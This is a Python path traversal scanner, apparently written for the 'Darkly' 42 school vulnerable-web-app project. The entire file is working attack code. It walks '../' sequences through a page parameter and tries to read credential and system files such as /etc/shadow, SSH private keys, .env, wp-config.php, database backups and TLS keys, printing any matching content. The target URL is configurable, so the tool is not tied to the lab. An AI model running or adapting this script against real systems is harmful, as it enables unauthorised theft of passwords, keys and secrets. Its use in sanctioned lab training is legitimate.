#!/usr/bin/env python3
import argparse
from pathlib import Path

import requests

SENSITIVE_FILES = [
    "etc/passwd",
    "etc/shadow",
    "etc/hosts",
    "etc/hostname",
    "etc/os-release",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/version",
    "var/log/apache2/access.log",
    "var/log/apache2/error.log",
    "var/log/nginx/access.log",
    "var/log/nginx/error.log",
    ".env",
    "config.php",
    "wp-config.php",
    "web.config",
    "appsettings.json",
    "settings.py",
    "database.yml",
    "secrets.json",
    "credentials.yaml",
    "config.ini",
    "docker-compose.yml",
    "id_rsa",
    "id_dsa",
    "authorized_keys",
    "ssh/authorized_keys",
    "ssh/id_rsa",
    "ssh/id_dsa",
    "htpasswd",
    "htaccess",
    "phpinfo.php",
    "backup.sql",
    "db.sqlite3",
    "private.key",
    "server.key",
    "ssl/cert.pem",
    "ssl/key.pem",
]


def scan_file(
    session: requests.Session,
    base_url: str,
    filename: str,
    max_depth: int,
    success_marker: str,
) -> bool:
    for depth in range(max_depth + 1):
        traversal = "../" * depth + filename
        url = f"{base_url}{traversal}"

        try:
            resp = session.get(url, timeout=5)
            if success_marker.lower() in resp.text.lower():
                idx = resp.text.lower().find(success_marker.lower())
                snippet = resp.text[max(0, idx - 50):idx + 200]
                print(f"\n[+] Marker found!")
                print(f"[+] URL:     {url}")
                print(f"[+] Depth:   {depth} ('{('../' * depth) or './'}')")
                print(f"[+] Snippet:\n{snippet}")
                return True
            else:
                print(f"[-] {depth:2d} x ../ | {filename}")
        except requests.RequestException as e:
            print(f"[!] Error at depth {depth} for '{filename}': {e}")

    return False


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Path traversal scanner for Darkly (42 project)."
    )
    parser.add_argument(
        "-u", "--url",
        default="http://localhost:8080/?page=",
        help="base URL with page param (default: %(default)s)",
    )
    parser.add_argument(
        "-d", "--depth",
        type=int,
        default=10,
        help="max traversal depth, i.e. max number of ../ (default: %(default)s)",
    )
    parser.add_argument(
        "-m", "--marker",
        default="flag",
        help="string to search for in response (default: %(default)s)",
    )
    parser.add_argument(
        "-f", "--file",
        default=None,
        help="scan a single file instead of the full list",
    )
    return parser.parse_args()


def main() -> None:
    args = parse_args()

    targets = [args.file] if args.file else SENSITIVE_FILES

    print(f"[*] Base URL:      {args.url}")
    print(f"[*] Max depth:     {args.depth}")
    print(f"[*] Success marker: {args.marker!r}")
    print(f"[*] Files to scan: {len(targets)}")
    print()

    try:
        with requests.Session() as session:
            for filename in targets:
                print(f"[>] Scanning: {filename}")
                found = scan_file(
                    session=session,
                    base_url=args.url,
                    filename=filename,
                    max_depth=args.depth,
                    success_marker=args.marker,
                )
                if found:
                    return

        print("\n[!] Scan complete. Marker not found in any file.")

    except KeyboardInterrupt:
        print("\n[!] Stopped by user.")


if __name__ == "__main__":
    main()
